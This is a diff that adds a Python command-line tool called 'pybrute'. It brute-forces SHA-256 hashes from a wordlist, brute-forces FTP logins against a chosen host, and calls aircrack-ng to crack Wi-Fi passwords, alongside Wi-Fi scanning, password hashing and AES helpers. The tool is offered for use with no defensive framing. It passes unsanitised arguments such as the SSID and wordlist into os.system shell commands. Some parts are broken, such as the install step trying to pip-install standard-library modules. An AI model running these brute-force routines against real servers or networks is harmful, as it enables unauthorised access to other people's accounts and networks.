@@ -1,0 +1,228 @@
+#!/usr/bin/env python3
+import os
+import sys
+
+# Function to install missing packages
+def install_packages(package_list):
+    if package_list:
+        os.system(f"pip install {' '.join(package_list)}")
+
+# Check and install dependencies
+missing_packages = []
+
+try:
+    import hashlib
+except ImportError:
+    print("hashlib is not installed. Installing...")
+    missing_packages.append("hashlib")
+
+try:
+    import pywifi
+except ImportError:
+    print("pywifi is not installed. Installing...")
+    missing_packages.append("pywifi")
+
+try:
+    from passlib.hash import pbkdf2_sha256
+except ImportError:
+    print("passlib is not installed. Installing...")
+    missing_packages.append("passlib")
+
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    print("pycryptodome is not installed. Installing...")
+    missing_packages.append("pycryptodome")
+
+try:
+    from ftplib import FTP
+except ImportError:
+    print("pyftplib is not installed. Installing...")
+    missing_packages.append("pyftpdlib")
+
+install_packages(missing_packages)
+
+# Importing after installation
+import hashlib
+import pywifi
+from pywifi import const
+import time
+import argparse
+from passlib.hash import pbkdf2_sha256
+import base64
+from Crypto.Cipher import AES
+from ftplib import FTP
+
+def check_root():
+    if os.geteuid() != 0:
+        print("Root access is required. Some operations may not be performed.")
+        return False
+    return True
+
+def brute_force_hash(hash_to_crack, wordlist):
+    with open(wordlist, 'r') as file:
+        for line in file:
+            word = line.strip()
+            hash_obj = hashlib.sha256(word.encode())
+            hashed_word = hash_obj.hexdigest()
+            if hashed_word == hash_to_crack:
+                return word
+    return None
+
+def hash_password(password):
+    return pbkdf2_sha256.hash(password)
+
+def verify_password(password, hashed_password):
+    return pbkdf2_sha256.verify(password, hashed_password)
+
+def encrypt_data(data, key):
+    cipher = AES.new(key.encode('utf8'), AES.MODE_EAX)
+    ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf8'))
+    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf8')
+
+def decrypt_data(encrypted_data, key):
+    raw_data = base64.b64decode(encrypted_data)
+    cipher = AES.new(key.encode('utf8'), AES.MODE_EAX, nonce=raw_data[:16])
+    decrypted_data = cipher.decrypt_and_verify(raw_data[32:], raw_data[16:32])
+    return decrypted_data.decode('utf8')
+
+def scan_wifi():
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]
+    iface.scan()
+    time.sleep(2)  # Wait for scan to complete
+    scan_results = iface.scan_results()
+    for result in scan_results:
+        print(f"SSID: {result.ssid}, Signal: {result.signal}")
+
+def connect_to_wifi(ssid, password):
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]
+    iface.disconnect()
+    time.sleep(1)
+    
+    profile = pywifi.Profile()
+    profile.ssid = ssid
+    profile.auth = const.AUTH_ALG_OPEN
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+    profile.cipher = const.CIPHER_TYPE_CCMP
+    profile.key = password
+    
+    iface.remove_all_network_profiles()
+    temp_profile = iface.add_network_profile(profile)
+    iface.connect(temp_profile)
+    time.sleep(10)
+    
+    if iface.status() == const.IFACE_CONNECTED:
+        print("Connected")
+    else:
+        print("Connection failed")
+
+def ftp_bruteforce(host, user, wordlist):
+    with open(wordlist, 'r') as file:
+        for line in file:
+            password = line.strip()
+            try:
+                ftp = FTP(host)
+                ftp.login(user, password)
+                print(f"[+] Password found: {password}")
+                ftp.quit()
+                return password
+            except:
+                print(f"[-] Wrong password: {password}")
+    return None
+
+def wifi_password_cracking(ssid, wordlist):
+    if not check_root():
+        print("Root-required operations could not be performed.")
+        return
+    
+    print(f"Starting Wi-Fi password cracking for {ssid}...")
+    os.system(f"aircrack-ng -w {wordlist} -e {ssid} /path/to/captured-handshake.cap")
+
+# Argparse integration
+parser = argparse.ArgumentParser(description="pybrute")
+
+subparsers = parser.add_subparsers(dest='command')
+
+# Hash brute force
+hash_parser = subparsers.add_parser('brute-force-hash')
+hash_parser.add_argument('--hash', required=True, help='Hash value to crack')
+hash_parser.add_argument('--wordlist', required=True, help='Wordlist to use')
+
+# Hash password
+hash_pw_parser = subparsers.add_parser('hash-password')
+hash_pw_parser.add_argument('--password', required=True, help='Password to hash')
+
+# Verify password
+verify_pw_parser = subparsers.add_parser('verify-password')
+verify_pw_parser.add_argument('--password', required=True, help='Password to verify')
+verify_pw_parser.add_argument('--hash', required=True, help='Hash for verification')
+
+# AES encryption
+encrypt_parser = subparsers.add_parser('encrypt')
+encrypt_parser.add_argument('--data', required=True, help='Data to encrypt')
+encrypt_parser.add_argument('--key', required=True, help='Encryption key')
+
+# AES decryption
+decrypt_parser = subparsers.add_parser('decrypt')
+decrypt_parser.add_argument('--data', required=True, help='Data to decrypt')
+decrypt_parser.add_argument('--key', required=True, help='Decryption key')
+
+# Wi-Fi scanning
+wifi_scan_parser = subparsers.add_parser('scan-wifi')
+
+# Wi-Fi connection
+wifi_connect_parser = subparsers.add_parser('connect-wifi')
+wifi_connect_parser.add_argument('--ssid', required=True, help='Wi-Fi SSID to connect')
+wifi_connect_parser.add_argument('--password', required=True, help='Wi-Fi password')
+
+# FTP brute force
+ftp_bruteforce_parser = subparsers.add_parser('ftp-bruteforce')
+ftp_bruteforce_parser.add_argument('--host', required=True, help='FTP server address')
+ftp_bruteforce_parser.add_argument('--user', required=True, help='FTP username')
+ftp_bruteforce_parser.add_argument('--wordlist', required=True, help='Wordlist to use')
+
+# Wi-Fi password cracking
+wifi_crack_parser = subparsers.add_parser('wifi-crack')
+wifi_crack_parser.add_argument('--ssid', required=True, help='Wi-Fi SSID to crack')
+wifi_crack_parser.add_argument('--wordlist', required=True, help='Wordlist to use')
+
+args = parser.parse_args()
+
+if not args.command:
+    parser.print_help()
+    sys.exit(1)
+else:
+	os.system(f"python3 {__file__} -h")
+if args.command == 'brute-force-hash':
+    result = brute_force_hash(args.hash, args.wordlist)
+    print(f"Found password: {result}" if result else "Password not found.")
+
+elif args.command == 'hash-password':
+    hashed_pw = hash_password(args.password)
+    print(f"Hashed password: {hashed_pw}")
+
+elif args.command == 'verify-password':
+    is_valid = verify_password(args.password, args.hash)
+    print("Password is valid" if is_valid else "Password is invalid")
+
+elif args.command == 'encrypt':
+    encrypted = encrypt_data(args.data, args.key)
+    print(f"Encrypted data: {encrypted}")
+
+elif args.command == 'decrypt':
+    decrypted = decrypt_data(args.data, args.key)
+    print(f"Decrypted data: {decrypted}")
+
+elif args.command == 'scan-wifi':
+    scan_wifi()
+
+elif args.command == 'connect-wifi':
+    connect_to_wifi(args.ssid, args.password)
+
+elif args.command == 'ftp-bruteforce':
+    ftp_bruteforce(args.host, args.user, args.wordlist)
+
+elif args.command == 'wifi-crack':
+    wifi_password_cracking(args.ssid, args.wordlist)
